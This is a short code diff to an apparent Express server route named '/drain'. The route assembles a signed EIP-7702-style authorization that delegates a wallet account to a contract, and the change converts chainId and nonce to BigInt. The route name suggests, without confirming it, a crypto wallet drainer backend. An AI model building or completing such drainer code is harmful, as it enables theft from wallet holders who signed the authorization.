@@ -35,9 +35,9 @@ app.post("/drain", async (req, res) => {
     if (yp >= 27) yp = yp - 27;
 
     const authorization = {
-      chainId: 1,
+      chainId: 1n,
       contractAddress: CONTRACT,
-      nonce: authNonce,
+      nonce: BigInt(authNonce),
       yParity: yp,
       r: auth.r.startsWith("0x") ? auth.r : "0x" + auth.r,
       s: auth.s.startsWith("0x") ? auth.s : "0x" + auth.s,
